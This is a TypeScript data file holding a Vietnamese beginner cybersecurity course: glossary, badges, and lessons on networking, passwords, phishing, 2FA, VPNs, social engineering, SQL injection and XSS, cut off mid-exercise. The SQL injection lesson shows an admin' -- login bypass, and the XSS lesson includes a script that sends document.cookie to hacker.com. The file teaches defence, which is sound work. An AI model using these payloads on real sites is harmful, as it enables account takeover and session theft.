import { Module, GlossaryEntry, Badge } from "@/types";

export const glossary: GlossaryEntry[] = [
  { term: "CPU", simple: "Bộ não của máy tính, làm mọi phép tính.", example: "Giống như đầu bếp trong bếp — ai cũng làm việc." },
  { term: "RAM", simple: "Bộ nhớ tạm, lưu việc đang làm dở.", example: "Giống mặt bàn bếp — để đồ đang nấu." },
  { term: "Ổ cứng", simple: "Nơi lưu trữ vĩnh viễn dữ liệu.", example: "Giống tủ lạnh — cất đồ lâu dài." },
  { term: "Hệ điều hành", simple: "Phần mềm quản lý toàn bộ máy tính.", example: "Giống người quản lý tòa nhà." },
  { term: "IP", simple: "Địa chỉ duy nhất của thiết bị trên mạng.", example: "Giống số nhà của bạn." },
  { term: "DNS", simple: "Hệ thống tra tên miền ra địa chỉ IP.", example: "Giống sổ danh bạ bưu điện." },
  { term: "Router", simple: "Thiết bị chuyển hướng gói tin trên mạng.", example: "Giống bưu cục địa phương." },
  { term: "Packet", simple: "Gói dữ liệu nhỏ được gửi qua mạng.", example: "Giống mảnh thư được bẻ nhỏ ra." },
  { term: "Server", simple: "Máy tính mạnh chứa website/dịch vụ.", example: "Giống nhà kho của shop online." },
  { term: "NAT", simple: "Kỹ thuật ánh xạ IP riêng ra IP công cộng.", example: "Giống bảo vệ tòa nhà — che số căn hộ." },
  { term: "HTTP", simple: "Giao thức truyền web không mã hóa.", example: "Giống bưu thiếp — ai cũng đọc được." },
  { term: "HTTPS", simple: "Giao thức web có mã hóa bảo mật.", example: "Giống thư trong két sắt." },
  { term: "TCP", simple: "Giao thức kết nối có xác nhận, đảm bảo tới nơi.", example: "Giống gọi điện thoại." },
  { term: "UDP", simple: "Giao thức gửi nhanh, không xác nhận.", example: "Giống báo cháy — hú còi, không cần trả lời." },
  { term: "SSH", simple: "Giao thức điều khiển máy tính từ xa an toàn.", example: "Giống đường hầm bí mật." },
  { term: "Mã hóa", simple: "Biến thông tin thành mật mã để bảo vệ.", example: "Giống viết thư bằng mật ngữ." },
  { term: "Phishing", simple: "Lừa đảo lấy thông tin qua email/website giả.", example: "Giống người giả danh công an gọi điện lừa." },
  { term: "Firewall", simple: "Tường lửa chặn truy cập trái phép.", example: "Giống bảo vệ soát vé ở cửa tòa nhà." },
  { term: "Linux", simple: "Hệ điều hành mã nguồn mở, bảo mật cao.", example: "Giống phòng lab chuyên nghiệp." },
  { term: "Windows", simple: "Hệ điều hành phổ biến dễ dùng.", example: "Giống văn phòng đầy đủ tiện nghi." },
  { term: "2FA", simple: "Xác thực 2 lớp — cần 2 cách khác nhau để chứng minh bạn là bạn.", example: "Giống như cửa có 2 ổ khóa, cần 2 chìa mới mở được." },
  { term: "VPN", simple: "Mạng riêng ảo — tạo đường hầm an toàn giữa bạn và web.", example: "Giống như đi xe trong đường hầm kín, không ai nhìn thấy." },
  { term: "Antivirus", simple: "Phần mềm diệt virus bảo vệ máy tính.", example: "Giống bác sĩ khám bệnh định kỳ cho máy tính." },
  { term: "Social Engineering", simple: "Kỹ thuật lừa người lấy thông tin, không cần hack máy.", example: "Giống lừa bạn đưa chìa khóa nhà thay vì phá khóa." },
  { term: "SQL Injection", simple: "Kỹ thuật chèn mã SQL qua ô nhập liệu.", example: "Giống nói tiếng lóng để máy tính hiểu sai mệnh lệnh." },
  { term: "XSS", simple: "Chèn mã độc vào website qua ô nhập liệu.", example: "Giống bỏ thư nặc danh có nội dung xấu vào hộp thư người khác." },
  { term: "Malware", simple: "Phần mềm độc hại — virus, trojan, ransomware.", example: "Giống các loại bệnh: cảm (virus), ngộ độc (trojan), bắt cóc (ransomware)." },
  { term: "Ransomware", simple: "Mã độc tống tiền — khóa dữ liệu đòi tiền chuộc.", example: "Giống kẻ xấu khóa cửa nhà bạn, đòi tiền mới mở." },
  { term: "Man-in-the-Middle", simple: "Tấn công nghe lén/giả mạo giữa 2 bên.", example: "Giống nhân viên bưu điện mở thư ra đọc rồi dán lại." },
  { term: "Zero-day", simple: "Lỗ hổng chưa ai biết, chưa có vá.", example: "Giống ổ khóa bị hỏng mà chưa ai phát hiện." },
  { term: "Patch", simple: "Bản vá lỗi phần mềm.", example: "Giống vá lỗ thủng trên tường." },
  { term: "Brute Force", simple: "Tấn công thử sai liên tục để tìm mật khẩu.", example: "Giống thử từng chìa khóa trong xâu chìa để mở cửa." },
  { term: "Encryption", simple: "Mã hóa thông tin.", example: "Giống viết thư bằng ngôn ngữ bí mật, chỉ người có 'sổ dịch' mới đọc được." },
  { term: "Decryption", simple: "Giải mã thông tin đã mã hóa.", example: "Giống dùng sổ dịch để đọc lá thư mật." },
  { term: "Keylogger", simple: "Phần mềm ghi lại mọi phím bạn gõ.", example: "Giống có người ngồi sau lưng nhìn bạn gõ mật khẩu." },
  { term: "Botnet", simple: "Mạng lưới máy tính bị điều khiển từ xa.", example: "Giống zombie — máy tính bị điều khiển mà chủ nhân không biết." },
  { term: "DDoS", simple: "Tấn công làm quá tải server bằng lượng truy cập khổng lồ.", example: "Giống triệu người cùng đổ vào 1 cửa hàng, không ai mua được." },
  { term: "Symmetric Key", simple: "Mã hóa đối xứng — 1 chìa khóa cho cả khóa và mở.", example: "Giống 1 chìa khóa duy nhất cho cả khóa và mở két." },
  { term: "Asymmetric Key", simple: "Mã hóa bất đối xứng — 2 chìa: 1 công khai, 1 riêng.", example: "Giống hòm thư: ai cũng bỏ thư được (khóa công khai), chỉ bạn mở được (khóa riêng)." },
  { term: "Hacker", simple: "Người tìm và khai thác lỗ hổng bảo mật.", example: "Giống thợ khóa — có người tốt (mũ trắng) và kẻ xấu (mũ đen)." },
  { term: "Click & Play", simple: "Môi trường mô phỏng an toàn để thực hành.", example: "Giống máy chơi game — thử thoải mái, không sợ hỏng thật." },
];

export const badges: Badge[] = [
  { id: "first_lesson", name: "Cú chạm đầu tiên", icon: "🎯", description: "Hoàn thành bài học đầu tiên" },
  { id: "week_streak", name: "Nhiệt huyết", icon: "🔥", description: "Học liên tiếp 7 ngày" },
  { id: "month_streak", name: "Cao thủ", icon: "⚡", description: "Học liên tiếp 30 ngày" },
  { id: "module_1", name: "Xóa mù thành công", icon: "🎓", description: "Hoàn thành Giai đoạn 1" },
  { id: "module_2", name: "Cao thủ bảo mật", icon: "🛡️", description: "Hoàn thành Giai đoạn 2" },
  { id: "module_3", name: "Mũ trắng", icon: "🧢", description: "Hoàn thành Giai đoạn 3" },
  { id: "module_4", name: "Chiến binh Lab", icon: "⚔️", description: "Hoàn thành Giai đoạn 4" },
  { id: "all_modules", name: "Tuyệt đỉnh", icon: "👑", description: "Hoàn thành TOÀN BỘ khóa học" },
  { id: "lab_rat", name: "Chuột bạch", icon: "🐭", description: "Hoàn thành bài Lab đầu tiên" },
  { id: "speedrun", name: "Tăng tốc", icon: "🏃", description: "Học speedrun 3 bài trong 1 ngày" },
];

export const modules: Module[] = [
  {
    id: "module-1",
    title: "Xóa mù CNTT",
    description: "Mạng Internet hoạt động thế nào? Hệ điều hành (Windows/Linux cơ bản).",
    goal: "Hiểu máy tính nói chuyện với nhau ra sao.",
    order: 1,
    lessons: [
      {
        id: "lesson-1-1",
        title: "Máy tính là 'căn bếp'",
        summary: "Máy tính giống như căn bếp nhà bạn. CPU là đầu bếp, RAM là mặt bàn, ổ cứng là tủ lạnh.",
        analogy: "CPU = Đầu bếp (người làm việc chính)\nRAM = Mặt bàn (chỗ để đồ đang làm dở)\nỔ cứng = Tủ lạnh + tủ khô (nơi cất thực phẩm)\nHệ điều hành = Công thức nấu ăn (hướng dẫn đầu bếp làm gì)",
        content: `## Máy tính hoạt động thế nào?

Khi bạn mở Word, CPU (đầu bếp) lấy dữ liệu từ ổ cứng (tủ lạnh) đặt lên RAM (mặt bàn) để làm việc. Xong thì lưu lại vào ổ cứng (bỏ vào tủ). Đơn giản vậy thôi.

### Các thành phần chính:
- **CPU** — Bộ não, làm mọi phép tính
- **RAM** — Bộ nhớ tạm, nhanh nhưng mất khi tắt máy
- **Ổ cứng (SSD/HDD)** — Bộ nhớ dài hạn, giữ dữ liệu khi tắt máy
- **Hệ điều hành** — Phần mềm quản lý mọi thứ`,
        estMinutes: 5,
        order: 1,
        exercise: {
          type: "fill-blank",
          question: "Khi chơi game, _____ (đầu bếp) xử lý đồ họa, dữ liệu nhân vật tạm thời nằm ở _____ (mặt bàn), và game được cài ở _____ (tủ lạnh).",
          correctAnswer: ["CPU", "RAM", "Ổ cứng"],
          explanation: "CPU xử lý, RAM chứa tạm, Ổ cứng lưu trữ lâu dài."
        }
      },
      {
        id: "lesson-1-2",
        title: "Internet là 'bưu điện'",
        summary: "IP là địa chỉ nhà, DNS là sổ danh bạ, gói tin là những mảnh thư được gửi đi.",
        analogy: "IP = Địa chỉ nhà của bạn\nDNS = Sổ danh bạ bưu điện\nRouter = Bưu cục địa phương\nPacket = Bức thư được bẻ nhỏ ra\nServer = Nhà kho của người bán hàng online",
        content: `## Internet hoạt động thế nào?

Internet là hệ thống bưu điện toàn cầu. Khi bạn gõ facebook.com:

1. Máy tính hỏi DNS: "Facebook ở đâu?"
2. DNS trả lời: "IP là 157.240.1.35"
3. Gói tin được bẻ nhỏ → gửi qua Router → đến Server Facebook → ráp lại → hiện trang web

### Thuật ngữ:
| Thuật ngữ | Dịch ra đời thường |
|---|---|
| IP | Địa chỉ nhà của bạn |
| DNS | Sổ danh bạ bưu điện |
| Router | Bưu cục địa phương |
| Packet | Bức thư bẻ nhỏ |
| Server | Nhà kho người bán |`,
        estMinutes: 7,
        order: 2,
        exercise: {
          type: "ordering",
          question: "Sắp xếp các bước đúng trình tự khi truy cập website:",
          items: [
            { id: "a", text: "DNS trả về địa chỉ IP" },
            { id: "b", text: "Trình duyệt hiện trang web" },
            { id: "c", text: "Máy tính gửi yêu cầu đến Server" },
            { id: "d", text: "Gói tin được ráp lại" },
            { id: "e", text: "Bạn gõ 'youtube.com'" },
            { id: "f", text: "Server gửi dữ liệu về" },
          ],
          correctAnswer: ["e", "a", "c", "f", "d", "b"],
          explanation: "Gõ URL → DNS tra IP → Gửi yêu cầu → Server trả về → Ráp gói tin → Hiện web."
        }
      },
      {
        id: "lesson-1-3",
        title: "IP công cộng vs IP riêng",
        summary: "IP công cộng là địa chỉ chung cư, IP riêng là số căn hộ. NAT là bảo vệ tòa nhà.",
        analogy: "IP công cộng = Địa chỉ chung cư của bạn\nIP riêng = Số căn hộ bên trong\nNAT = Bảo vệ tòa nhà — người ngoài thấy địa chỉ chung cư, không thấy số căn hộ",
        content: `## IP công cộng và IP riêng

Cả xóm bạn dùng chung 1 IP công cộng (một chung cư). Khi bạn vào web, Router (bảo vệ) ghi nhớ: "Căn 12 gửi thư này". Khi thư về, bảo vệ chuyển đúng căn 12.

### Vì sao quan trọng?
- **Bảo mật**: Kẻ tấn công chỉ thấy địa chỉ chung cư, không biết căn nào
- **Tiết kiệm**: Hàng tỷ thiết bị dùng chung vài tỷ IP công cộng
- **Router là rào chắn tự nhiên**: Ngăn truy cập trực tiếp từ ngoài vào`,
        estMinutes: 5,
        order: 3,
        exercise: {
          type: "true-false",
          question: "Đánh giá các câu sau đúng hay sai:",
          items: [
            { id: "a", text: "Máy tính trong cùng nhà có IP riêng khác nhau" },
            { id: "b", text: "Cả thế giới truy cập thẳng vào máy bạn qua IP riêng" },
            { id: "c", text: "Router đóng vai trò như bảo vệ tòa nhà" },
          ],
          correctAnswer: ["true", "false", "true"],
          explanation: "IP riêng khác nhau trong cùng mạng. NAT chặn truy cập từ ngoài. Router thực sự là bảo vệ."
        }
      },
      {
        id: "lesson-1-4",
        title: "Hệ điều hành — 'người quản lý'",
        summary: "Windows dễ dùng, Linux bảo mật, macOS sang trọng. Hệ điều hành là người trung gian.",
        analogy: "Windows = Văn phòng dễ dùng, cửa sổ hay mở\nLinux = Phòng lab chuyên nghiệp, khóa cẩn thận\nmacOS = Căn hộ thiết kế đẹp, chỉ đồ Apple vào được",
        content: `## Hệ điều hành là gì?

Hệ điều hành là người quản lý trung gian: bạn muốn in file → báo với HĐH → HĐH bảo máy in làm.

### So sánh nhanh:

| Việc | Windows | Linux |
|---|---|---|
| Cài phần mềm | Nhấn .exe | Gõ lệnh sudo apt install |
| Dùng ổ cứng | Ổ C:, Ổ D: | /home, /var, /etc |
| Bảo mật | Cần antivirus | Mặc định an toàn hơn |`,
        estMinutes: 6,
        order: 4,
        exercise: {
          type: "multiple-choice",
          question: "Bạn muốn chạy web server giá rẻ cho startup. Nên chọn HĐH nào?",
          options: [
            "A. Windows — quen dùng",
            "B. Linux — miễn phí, bảo mật tốt",
            "C. macOS — sang trọng",
          ],
          correctAnswer: "B",
          explanation: "Linux miễn phí, bảo mật cao, chiếm đa số thị trường server."
        }
      },
      {
        id: "lesson-1-5",
        title: "Giao thức — 'luật giao thông'",
        summary: "HTTP/HTTPS, TCP/UDP, SSH — mỗi giao thức như một luật giao thông riêng.",
        analogy: "HTTP = Bưu thiếp — ai cũng đọc được\nHTTPS = Thư trong két sắt\nTCP = Gọi điện — có bắt máy, có cúp\nUDP = Báo cháy — hú còi không cần xác nhận\nSSH = Mật thư — đường hầm bí mật",
        content: `## Giao thức là luật giao thông trên mạng

| Giao thức | Luật giao thông |
|---|---|
| HTTP | Xe đi đúng làn, không bảo mật |
| HTTPS | Xe đi đúng làn, có bảo mật |
| TCP | Gọi điện — kết nối chắc chắn |
| UDP | Báo cháy — nhanh, có thể mất gói |
| SSH | Đường hầm bí mật |

### Khi nào dùng giao thức nào?
- **Xem phim Netflix** → UDP (cần nhanh, mất vài khung hình không sao)
- **Chuyển tiền online** → HTTPS (bắt buộc bảo mật)
- **Điều khiển server** → SSH (cần an toàn tuyệt đối)`,
        estMinutes: 7,
        order: 5,
        exercise: {
          type: "match",
          question: "Ghép giao thức với tình huống phù hợp:",
          items: [
            { id: "a", text: "Xem phim Netflix" },
            { id: "b", text: "Chuyển tiền online" },
            { id: "c", text: "Điều khiển server từ xa" },
          ],
          options: ["TCP", "UDP", "HTTP", "HTTPS", "SSH"],
          correctAnswer: ["UDP", "HTTPS", "SSH"],
          explanation: "Netflix cần nhanh (UDP), chuyển tiền cần bảo mật (HTTPS), điều khiển server cần SSH."
        }
      },
    ],
  },
  {
    id: "module-2",
    title: "Căn bản bảo mật",
    description: "Mật khẩu, Mã hóa cơ bản, Phishing (Lừa đảo mạng), 2FA, VPN, Antivirus.",
    goal: "Nhận diện được rủi ro hằng ngày.",
    order: 2,
    lessons: [
      {
        id: "lesson-2-1",
        title: "Mật khẩu — 'chìa khóa nhà'",
        summary: "Mật khẩu yếu như ổ khóa giấy. Học cách đặt mật khẩu mạnh và quản lý chúng.",
        analogy: "Mật khẩu giống như chìa khóa nhà bạn. '123456' là để cửa mở toang. 'P@ssw0rd' là khóa cơ bản. 'T0iY3uC0nCh0$2024!' là khóa chống trộm.",
        content: `## Mật khẩu — tuyến phòng thủ đầu tiên

Kẻ xấu có thể 'đoán' mật khẩu của bạn bằng cách:
- **Brute Force (Vét cạn)**: Thử lần lượt từ 'a', 'b',... đến 'zzzz...'
- **Từ điển**: Thử các từ phổ biến như 'password', '123456', 'iloveyou'
- **Doxing**: Đoán dựa trên thông tin cá nhân (tên, ngày sinh, tên pet)

### Cách đặt mật khẩu mạnh:
- **Dài**: Ít nhất 12 ký tự
- **Khó đoán**: Hoa, thường, số, ký tự đặc biệt
- **Không dùng lại**: Mỗi trang 1 mật khẩu riêng
- **Dùng câu** thay vì từ: 'HomNayToiDiHoc@7h' dễ nhớ hơn 'kD9#mP2!'

### Công cụ hỗ trợ:
- **Password Manager**: 1 mật khẩu chính để vào 'két sắt' chứa các mật khẩu khác
- **Ví dụ**: Bitwarden (miễn phí), 1Password, Apple Keychain`,
        estMinutes: 7,
        order: 1,
        exercise: {
          type: "multiple-choice",
          question: "Mật khẩu nào dưới đây MẠNH nhất?",
          options: [
            "A. password123",
            "B. MèoCủaTôiĂnCá@7hSáng!",
            "C. Admin@2024",
            "D. 123456789",
          ],
          correctAnswer: "B",
          explanation: "Câu dài >12 ký tự, có ký tự đặc biệt, số, hoa thường — rất khó brute force."
        }
      },
      {
        id: "lesson-2-2",
        title: "Mã hóa — 'viết thư mật'",
        summary: "Mã hóa biến thông tin thành 'mật ngữ' chỉ người có chìa khóa mới đọc được.",
        analogy: "Mã hóa giống như bé và bạn thân viết thư bằng 'ngôn ngữ riêng'. Cả lớp đọc được nhưng không hiểu. Chỉ 2 đứa có 'sổ dịch' mới hiểu.",
        content: `## Mã hóa là gì?

Mã hóa là 'xào nấu' thông tin thành hỗn độn, chỉ có 'chìa khóa' mới 'nấu ngược' lại được.

### 2 loại mã hóa chính:

**1. Đối xứng (Symmetric) — 1 chìa cho cả khóa và mở**
- Giống 1 chìa khóa duy nhất cho cả ổ khóa và mở
- Nhanh, đơn giản
- Ví dụ: AES — dùng trong mã hóa ổ cứng, file

**2. Bất đối xứng (Asymmetric) — 2 chìa: 1 công khai, 1 riêng**
- Giống hòm thư: ai cũng bỏ thư được (khóa công khai), chỉ bạn mở được (khóa riêng)
- Chậm hơn nhưng an toàn hơn
- Ví dụ: RSA — dùng trong HTTPS, chữ ký số

### Mã hóa trong đời sống:
- **HTTPS**: Ổ khóa xanh trên trình duyệt
- **Messenger/Zalo**: Tin nhắn được mã hóa
- **ATM**: Thông tin thẻ được mã hóa khi quẹt`,
        estMinutes: 8,
        order: 2,
        exercise: {
          type: "true-false",
          question: "Đánh giá đúng/sai:",
          items: [
            { id: "a", text: "Mã hóa đối xứng dùng 2 chìa khóa khác nhau" },
            { id: "b", text: "HTTPS sử dụng mã hóa để bảo vệ dữ liệu" },
            { id: "c", text: "Chìa khóa công khai có thể chia sẻ cho mọi người" },
          ],
          correctAnswer: ["false", "true", "true"],
          explanation: "Đối xứng dùng 1 chìa. HTTPS có mã hóa. Khóa công khai là để chia sẻ."
        }
      },
      {
        id: "lesson-2-3",
        title: "Phishing — 'lừa đảo mạng'",
        summary: "Phishing là khi kẻ xấu giả danh người quen/công ty để lừa bạn nhấp link độc.",
        analogy: "Giống có người giả danh nhân viên điện lực gõ cửa bảo 'kiểm tra đồng hồ', thực ra là vào nhà trộm đồ.",
        content: `## Nhận diện Phishing

### 3 dấu hiệu nhận biết email/ tin nhắn lừa đảo:

**1. Gấp gáp, đe dọa:**
- 'Tài khoản bạn sắp bị khóa! Nhấp NGAY để xác thực!'
- 'Bạn trúng thưởng 50 triệu! Nhấp vào đây nhận ngay!'

**2. Link giả mạo:**
- \`faceb00k.com\` (số 0 thay chữ o)
- \`googIe.com\` (chữ I hoa thay L)
- Luôn DI CHUỘT lên link để xem địa chỉ thật

**3. Yêu cầu thông tin cá nguy hiểm:**
- Mật khẩu, mã OTP, số thẻ tín dụng
- Ngân hàng KHÔNG BAO GIỜ hỏi những thứ này qua email

### 4 bước phòng tránh:
1. Đừng vội nhấp — dừng lại, suy nghĩ
2. Kiểm tra địa chỉ email người gửi
3. Di chuột lên link xem địa chỉ thật
4. Nếu nghi ngờ, vào thẳng trang web chính thức`,
        estMinutes: 8,
        order: 3,
        exercise: {
          type: "multiple-choice",
          question: "Bạn nhận được email 'Ngân hàng ABC: Tài khoản sắp bị khóa, nhấp vào đây để xác thực'. Bạn làm gì?",
          options: [
            "A. Nhấp ngay, sợ mất tài khoản",
            "B. Kiểm tra địa chỉ email gửi, nếu nghi thì vào web ngân hàng trực tiếp",
            "C. Forward cho bạn bè để cảnh báo",
            "D. Reply email đó hỏi lại",
          ],
          correctAnswer: "B",
          explanation: "Luôn kiểm tra kỹ, vào thẳng web chính thức thay vì nhấp link trong email."
        }
      },
      {
        id: "lesson-2-4",
        title: "2FA — 'khóa 2 lớp'",
        summary: "2 lớp bảo vệ: mật khẩu + thêm 1 lớp nữa (SMS, app, vân tay).",
        analogy: "Mật khẩu là chìa khóa cửa. 2FA là thêm 1 ổ khóa nữa — dù có chìa cũng chưa mở được, cần thêm vân tay hoặc mã từ điện thoại.",
        content: `## Bảo vệ 2 lớp (2FA)

### Tại sao cần 2FA?
Nếu mật khẩu bị lộ, kẻ xấu vẫn không vào được vì thiếu 'lớp 2'.

### 3 loại 2FA phổ biến:
| Loại | Ví dụ | Độ an toàn |
|---|---|---|
| SMS/Email | Mã gửi qua tin nhắn | ⚠️ Tương đối (có thể bị SIM swap) |
| App Authenticator | Google Authenticator, Authy | ✅ An toàn |
| Hardware Key | YubiKey | ✅✅ Rất an toàn |

### BẬT 2FA NGAY cho:
- Email (Gmail, Outlook)
- Mạng xã hội (Facebook, Instagram)
- Ngân hàng
- GitHub, AWS (nếu làm IT)

### Mẹo:
- Dùng app Authenticator (không phụ thuộc SIM)
- In mã dự phòng để ở ví (phòng mất điện thoại)`,
        estMinutes: 6,
        order: 4,
        exercise: {
          type: "multiple-choice",
          question: "Loại 2FA nào an toàn NHẤT?",
          options: [
            "A. Mã SMS gửi qua tin nhắn",
            "B. Mã từ Google Authenticator",
            "C. Khóa bảo mật vật lý YubiKey",
            "D. Mã gửi qua email",
          ],
          correctAnswer: "C",
          explanation: "YubiKey là thiết bị vật lý, không thể hack từ xa. An toàn nhất trong 3 loại."
        }
      },
      {
        id: "lesson-2-5",
        title: "VPN — 'đường hầm bí mật'",
        summary: "VPN tạo một đường hầm riêng giữa bạn và web, che giấu mọi hoạt động.",
        analogy: "Internet là đường phố đông người. VPN là đi trong đường hầm kín — không ai thấy bạn đi đâu, làm gì. Khi ra khỏi hầm, bạn 'xuất hiện' ở một thành phố khác.",
        content: `## VPN — Mạng riêng ảo

### VPN làm gì?
1. **Mã hóa dữ liệu** — không ai nghe lén được
2. **Đổi IP** — bạn 'xuất hiện' ở nước khác
3. **Che giấu hoạt động** — ISP, chính phủ không biết bạn vào web nào

### Khi nào nên dùng VPN?
- **WiFi công cộng** (quán cà phê, sân bay) — bắt buộc
- **Xem nội dung giới hạn vùng** (Netflix Mỹ, BBC)
- **Che giấu với ISP** — nhà mạng không bán dữ liệu của bạn
- **Torrent** (nếu bạn dùng)

### Lưu ý quan trọng:
- VPN không phải 'tàng hình' — web vẫn biết bạn qua cookie
- Chọn VPN có **log policy: No-log** (NordVPN, Mullvad, ProtonVPN)
- VPN miễn phí thường là 'mồi' — họ bán dữ liệu của bạn`,
        estMinutes: 7,
        order: 5,
        exercise: {
          type: "match",
          question: "Ghép tình huống với giải pháp:",
          items: [
            { id: "a", text: "Dùng WiFi quán cà phê" },
            { id: "b", text: "Xem Netflix chỉ có ở Mỹ" },
            { id: "c", text: "Che giấu với nhà mạng" },
          ],
          options: ["Dùng VPN", "Bật 2FA", "Cài Antivirus", "Đổi mật khẩu"],
          correctAnswer: ["Dùng VPN", "Dùng VPN", "Dùng VPN"],
          explanation: "VPN bảo vệ trên WiFi công cộng, đổi IP xem nội dung vùng, che giấu với ISP."
        }
      },
      {
        id: "lesson-2-6",
        title: "Antivirus & Firewall — 'bác sĩ + bảo vệ'",
        summary: "Antivirus diệt virus, Firewall chặn xâm nhập — bộ đôi bảo vệ máy tính.",
        analogy: "Antivirus là bác sĩ khám bệnh định kỳ. Firewall là bảo vệ soát vé ở cửa — chỉ cho người có phép vào.",
        content: `## Bộ đôi bảo vệ

### Antivirus — Bác sĩ
- **Quét** file, phát hiện virus
- **Cách ly** file nhiễm trước khi chúng gây hại
- **Cập nhật** định kỳ để nhận biết virus mới

### Firewall — Bảo vệ
- **Chặn truy cập trái phép** từ ngoài vào
- **Kiểm soát** app nào được ra Internet
- **Ghi log** — ghi lại mọi kết nối đáng ngờ

### Cách dùng:
- **Windows**: Windows Defender (đã có sẵn, khá tốt)
- **macOS**: XProtect (tích hợp sẵn)
- **Linux**: Rất ít virus, nhưng vẫn cần firewall (UFW)

### 4 thói quen tốt:
1. Cập nhật phần mềm thường xuyên (vá lỗ)
2. Không tải file từ nguồn không tin cậy
3. Không tắt Windows Defender
4. Quét USB trước khi mở`,
        estMinutes: 6,
        order: 6,
        exercise: {
          type: "true-false",
          question: "Đánh giá đúng/sai:",
          items: [
            { id: "a", text: "Firewall ngăn người lạ truy cập vào máy tính" },
            { id: "b", text: "Windows Defender là đủ, không cần antivirus khác" },
            { id: "c", text: "Linux không bao giờ bị virus" },
          ],
          correctAnswer: ["true", "true", "false"],
          explanation: "Firewall chặn xâm nhập. WinDefender khá tốt cho người dùng cơ bản. Linux hiếm virus nhưng không phải 'không bao giờ'."
        }
      },
    ],
  },
  {
    id: "module-3",
    title: "Hacker tư duy ra sao?",
    description: "Các lỗ hổng phổ biến, Cách kẻ xấu xâm nhập, Social Engineering.",
    goal: "Hiểu tư duy tấn công để phòng thủ.",
    order: 3,
    lessons: [
      {
        id: "lesson-3-1",
        title: "Social Engineering — 'lừa người dễ hơn hack máy'",
        summary: "Kẻ xấu lừa bạn tự mở cửa thay vì phá khóa. Đây là kỹ thuật nguy hiểm nhất.",
        analogy: "Thay vì phá ổ khóa (hack kỹ thuật), kẻ xấu giả danh nhân viên bảo trì thang máy để bạn tự mở cửa cho họ vào. Đó là Social Engineering.",
        content: `## Tấn công vào CON NGƯỜI — điểm yếu nhất

### 4 kỹ thuật Social Engineering phổ biến:

**1. Pretexting — Giả danh**
- 'Alo, em là nhân viên tổng đài ngân hàng ạ. Tài khoản anh gặp sự cố...'
- Mục đích: Lấy OTP, mật khẩu

**2. Baiting — Nhử mồi**
- USB 'quên' ở bãi gửi xe, có ghi 'Lương tháng 13'
- Người nhặt cắm vào máy → virus

**3. Tailgating — Đi theo**
- Đi theo người khác qua cửa an ninh văn phòng
- 'Ơ quên thẻ, anh/chị giữ cửa giúp em với!'

**4. Quid Pro Quo — Đánh đổi**
- 'Em gọi từ IT, anh cho em pass để em update Windows giúp nhé'

### Cách phòng tránh:
- **Xác minh danh tính** — gọi lại số điện thoại chính thức
- **Không tra thông tin** cho người gọi đến
- **Không cắm USB lạ** vào máy
- **Giữ cửa** — không cho người lạ vào văn phòng`,
        estMinutes: 7,
        order: 1,
        exercise: {
          type: "multiple-choice",
          question: "Bạn nhận được cuộc gọi: 'Anh/chị ơi, em từ IT. Hệ thống phát hiện máy anh bị lỗi, anh cho em pass để em sửa ạ.' Bạn làm gì?",
          options: [
            "A. Đưa pass — họ là IT mà",
            "B. Hỏi tên, phòng ban, rồi gọi lại tổng đài IT chính thức xác minh",
            "C. Chửi rồi cúp máy",
            "D. Đưa pass nhưng yêu cầu họ gửi email xác nhận",
          ],
          correctAnswer: "B",
          explanation: "Luôn xác minh qua kênh chính thức. Không bao giờ đưa mật khẩu cho bất kỳ ai qua điện thoại."
        }
      },
      {
        id: "lesson-3-2",
        title: "SQL Injection — 'nói tiếng lóng' với máy tính",
        summary: "Hacker chèn mã SQL vào ô nhập liệu để đánh lừa cơ sở dữ liệu.",
        analogy: "Giống như bạn vào quán phở, gọi '1 tô phở' (bình thường). SQL Injection là nói '1 tô phở MIỄN PHÍ ĐẦU BẾP PHA CHẾ CHO TÔI' — nếu đầu bếp nghe theo, bạn ăn không mất tiền.",
        content: `## SQL Injection là gì?

SQL là ngôn ngữ nói chuyện với cơ sở dữ liệu. Khi bạn đăng nhập, máy tính chạy lệnh SQL:
\`\`\`
SELECT * FROM users WHERE username = 'tên_bạn' AND password = 'mật_khẩu'
\`\`\`

### Cách tấn công:
Thay vì gõ tên 'admin', hacker gõ:
\`admin' --\`
Lệnh SQL thành:
\`SELECT * FROM users WHERE username = 'admin' --' AND password = '...'\`
→ Phần password bị 'comment' (bỏ qua), hacker vào được tài khoản admin.

### Hậu quả:
- Đánh cắp tài khoản, mật khẩu
- Xóa dữ liệu
- Lấy cắp thông tin thẻ tín dụng

### Phòng tránh (cho lập trình viên):
- Không ghép chuỗi SQL thủ công
- Dùng Prepared Statements (câu lệnh đã chuẩn bị sẵn)
- Validate đầu vào — chặn ký tự đặc biệt`,
        estMinutes: 8,
        order: 2,
        exercise: {
          type: "true-false",
          question: "Đánh giá:",
          items: [
            { id: "a", text: "SQL Injection lợi dụng ô nhập liệu để chèn mã" },
            { id: "b", text: "SQL Injection chỉ ảnh hưởng đến cơ sở dữ liệu" },
            { id: "c", text: "Dùng Prepared Statements ngăn được SQL Injection" },
          ],
          correctAnswer: ["true", "true", "true"],
          explanation: "Cả 3 đều đúng. SQLi chèn qua ô nhập, ảnh hưởng DB, Prepared Statements là cách phòng chuẩn."
        }
      },
      {
        id: "lesson-3-3",
        title: "XSS — 'bỏ thư lạ vào hộp thư'",
        summary: "Hacker chèn mã độc vào website để đánh cắp thông tin người dùng khác.",
        analogy: "Giống như có người bỏ lá thư nặc danh có nội dung xấu vào hộp thư nhà bạn. Khi bạn mở ra đọc, 'thuốc nổ' phát tác.",
        content: `## XSS (Cross-Site Scripting)

Hacker chèn mã JavaScript độc hại vào website. Khi người dùng khác truy cập, mã này chạy trong trình duyệt họ.

### Các dạng XSS:

**1. Stored XSS — Lưu trữ**
- Hacker đăng bình luận có mã độc
- Ai xem trang đó cũng bị dính
- Ví dụ: \`<script>fetch('hacker.com?cookie='+document.cookie)</script>\`

**2. Reflected XSS — Phản chiếu**
- Link chứa mã độc
- Nạn nhân nhấp link → mã chạy
- Ví dụ: \`https://web.com/search?q=<script>...</script>\`

### Hậu quả:
- Đánh cắp cookie (đăng nhập thay bạn)
- Chuyển hướng đến web giả mạo
- Ghi lại phím bấm (keylogger)

### Phòng tránh:
- **Không nhấp link lạ** — cơ bản nhất
- **Dùng trình duyệt cập nhật** — Chrome/Firefox có cơ chế chống XSS
- **Tắt JavaScript** khi duyệt web không tin cậy (dùng NoScript)`,
        estMinutes: 7,
        order: 3,
        exercise: {
          type: "fill-blank",
          question: "XSS là viết tắt của _____ (tên đầy đủ). Hacker _____ mã độc vào website để đánh cắp thông tin.",
          correctAnswer: ["Cross-Site Scripting", "chèn"],
